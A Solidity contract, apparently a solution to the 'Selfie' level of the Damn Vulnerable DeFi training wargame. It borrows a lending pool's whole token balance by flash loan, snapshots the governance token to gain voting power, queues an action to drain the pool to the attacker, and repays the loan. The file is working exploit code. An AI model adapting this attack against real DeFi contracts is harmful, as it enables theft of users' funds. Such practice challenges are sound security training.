// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "../DamnValuableTokenSnapshot.sol";

interface IPool {
    function flashLoan(uint256 amount) external;
}

interface IGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}  

interface IToken {
    function snapshot() external returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}


contract SelfieAttack  {
    IPool private immutable pool;
    address private attacker;
    IGovernance private immutable governance;
    IToken private immutable token;

    constructor(address _poolAddress, address _governanceAddress, address _tokenAddress){
        pool = IPool(_poolAddress);
        governance = IGovernance(_governanceAddress);
        token = IToken(_tokenAddress);
        attacker = msg.sender;
    }
   function Attack () external  {
        pool.flashLoan(token.balanceOf(address(pool)));
        
   }
   /* flashLoan callback */
   /* queue the action to drain all funds from the pool */
   /* transfer the tokens back to the pool */
   function receiveTokens(address _tokenAddress, uint256 _amount) external  {
        IToken(_tokenAddress).snapshot();
        governance.queueAction(address(pool), abi.encodeWithSignature("drainAllFunds(address)", attacker), 0);
        token.transfer(address(pool), _amount);
   }
}